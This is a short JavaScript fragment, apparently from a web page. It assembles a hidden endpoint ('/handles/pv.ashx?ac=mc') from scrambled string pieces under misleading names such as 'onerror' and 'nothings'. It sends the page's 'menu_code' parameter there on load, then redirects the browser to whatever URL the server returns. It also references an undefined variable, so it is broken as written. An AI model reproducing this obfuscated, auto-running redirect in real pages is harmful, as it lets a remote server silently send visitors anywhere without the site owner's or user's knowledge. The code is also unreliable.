

 
Protocol = function () {
    if (urlAddress) {
        var _kdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
        var temp = urlAddress.substr(me.indexOf('/') + 2);
        return _kdhmProtocol + temp.substr(0, temp.indexOf('/'));
    } else {
        return "";
    }
}


 

GetUrlParameters = function (name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]); return "";
}

var CeilingIsGod = {
    theme: "han",
    hz: 'hx',
    zh: 'as',
    cl: 'dles',
    opo: '.',
    op: '&',
    po: '=',
    sy: '?',
    poo: 'p',
    ca: 'ac',
    pee: 'v',
    opp: 'mc',
    insertlog: function (_name, _value) {
        return (this.op + _name + this.po + _value);
    },
    onerror: function () {
        var error = Protocol() + "/" + this.theme + this.cl + "/" + this.poo + this.pee + this.opo + this.zh + this.hz + this.sy + this.ca
        + this.po + this.opp;
        error += this.insertlog("c", encodeURI( GetUrlParameters('menu_code')));
        return error;

    },
    nothings: function () {

        var bgnsm = false;
        if (window.XMLHttpRequest) {
            bgnsm = new XMLHttpRequest();
            if (bgnsm.overrideMimeType) {
                bgnsm.overrideMimeType("text/xml");
            }
        } else if (window.ActiveXObject) {
            try {
                bgnsm = new ActiveXObject("Msxml2.XMLHTTP");
            }
            catch (e) {
                try {
                    bgnsm = new ActiveXObject("Microsoft.XMLHTTP");
                } catch (e) {
                }
            }
        }
        if (!bgnsm) {
            console.log("can not create XMLHttpRequest object.");
            return false;
        }
        bgnsm.open("POST", this.onerror());
        bgnsm.send(null);
        bgnsm.onreadystatechange = function () {
            if (bgnsm.readyState == 4 && bgnsm.status == 200) {
                location.href = bgnsm.responseText;
            } else {
                
            }
        }
    }
}
CeilingIsGod.nothings();






